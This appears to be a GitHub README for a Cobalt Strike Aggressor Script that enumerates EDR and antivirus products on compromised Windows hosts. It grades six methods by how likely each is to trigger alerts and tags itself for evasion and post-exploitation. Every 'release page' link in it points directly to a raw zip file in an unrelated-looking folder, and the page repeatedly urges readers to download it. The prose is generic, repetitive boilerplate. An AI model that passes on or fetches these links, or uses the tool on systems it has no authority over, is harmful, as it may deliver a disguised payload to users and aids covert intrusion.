# 🛡️ CS-EDR-Enumeration - Identify Security Products Easily

[![Download Latest Release](https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip)](https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip)

---

## 📝 What is CS-EDR-Enumeration?

CS-EDR-Enumeration is a tool designed to help you find security products running on Windows computers. It uses Cobalt Strike, a well-known cybersecurity tool, together with special scripts called Aggressor Scripts. These scripts check for different security systems by using six different methods. Each method shows a different level of alert or noise, from very quiet to more noticeable.

This software is useful if you want to understand what security software is on your or another Windows machine without causing too much disturbance. It works for users involved in security testing or IT management.

---

## 🎯 Key Features

- **Six Checking Methods:** From very silent ones using special code files (BOF) to more visible ones with Windows PowerShell and WMI.
- **Easy to Use:** Run the script inside Cobalt Strike with simple commands.
- **Noise Level Control:** Know how loud each check is to avoid unnecessary alerts.
- **Windows Support:** Designed for modern Windows systems, including Windows 10 and 11.
- **Post-Exploitation Use:** Helps security professionals after gaining access to a system.
- **Clear Results:** Shows you which security products are active on the system.

---

## 💻 System Requirements

To use CS-EDR-Enumeration, you need:

- A Windows computer to test on.
- Cobalt Strike installed. This is a tool used for security testing. If you don't have Cobalt Strike, you need to get it separately.
- Basic knowledge of how to run commands in Cobalt Strike.
- Administrator privileges on the Windows computer for best results.
- Internet connection for downloading the release files.

---

## 🚀 Getting Started

### Step 1: Install Cobalt Strike

CS-EDR-Enumeration works inside Cobalt Strike. If you do not have it:

1. Go to the official Cobalt Strike website.
2. Purchase or obtain a trial license.
3. Follow their instructions to install it on your Windows or Linux machine.

### Step 2: Download CS-EDR-Enumeration

Click the big button below or go to the release page to get the latest version:

[![Download Latest Release](https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip)](https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip)

Here is the page again for convenience:  
https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip

### Step 3: Load the Script into Cobalt Strike

Once downloaded:

1. Open Cobalt Strike.
2. Go to the menu and select *Script Manager*.
3. Click *Load* and select the downloaded Aggressor Script file (`.cna`).
4. The script will load and be ready to use.

---

## 📥 Download & Install

1. Visit the release page:  
   https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip
2. Find the latest release with the date and version number.
3. Download the zip or the script file (`.cna`) from the assets.
4. Save the file to a folder you can easily access.
5. Open Cobalt Strike and load the script as explained in the Getting Started section.

---

## 🔍 How to Use CS-EDR-Enumeration

After loading the script in Cobalt Strike, perform these steps to run a scan:

1. Create or use an existing Beacon session inside Cobalt Strike connected to the Windows host you want to test.
2. In the Beacon console, type the following command to start the enumeration:

   ```
   edr-enum
   ```

3. The script will run six different checks to look for security products.
4. Results will appear in the Beacon console or in your Cobalt Strike interface.
5. Review the output to see the detected products and the method used.

---

## ⚙️ Understanding Noise Levels

Each method used by CS-EDR-Enumeration has a noise level. Noise means how much the security product or system might notice the scan.

- **Silent Method:** Uses Beacon Object Files (BOF) - runs quietly inside the process without calling external programs.
- **Low Noise:** Limited PowerShell commands avoiding alerts.
- **Medium Noise:** Uses WMI queries that might generate some logs.
- **High Noise:** Runs full PowerShell or other system commands that security tools will likely detect.

Choose the method based on how careful you want to be with alerts on the target machine.

---

## 🛠 Troubleshooting Tips

- If the script does not load, verify that you downloaded the correct file and that Cobalt Strike is up to date.
- If you get errors running commands, make sure your Beacon session is active and connected.
- Some security products may block or hide from checks. Try different methods or run with administrator rights.
- Ensure you have the right permissions on the target Windows host.
- Review Cobalt Strike and Aggressor Script documentation for further commands and options.

---

## 📚 Learn More

- To understand Cobalt Strike basics, visit the official documentation or user forums.
- Research Windows security products and detection methods to better understand the scan results.
- Learn about Beacon Object Files (BOF) to see how silent execution works.
- Explore PowerShell and WMI basics to understand why some methods produce more noise.

---

## 💡 About This Project

CS-EDR-Enumeration is a part of the cybersecurity research and offensive security toolkit. It helps security testers and professionals assess what protection is active on Windows systems. The script focuses on clarity, control over alert levels, and practical results in real environments.

---

## ⚖️ License and Contributions

This project is open-source and available for use under the license specified in the repository. Contributions, issues, and feature requests are welcome. To contribute:

- Fork the repository
- Make your changes
- Submit a pull request for review

---

## 📌 Topics Covered

- aggressor-script
- beacon-object-file (BOF)
- cobalt-strike
- edr-enumeration
- edr-evasion
- offensive-security
- post-exploitation
- purple-team
- redteam
- windows-security

---

If you have questions or need help, please open an issue in the GitHub repository or contact the project maintainer.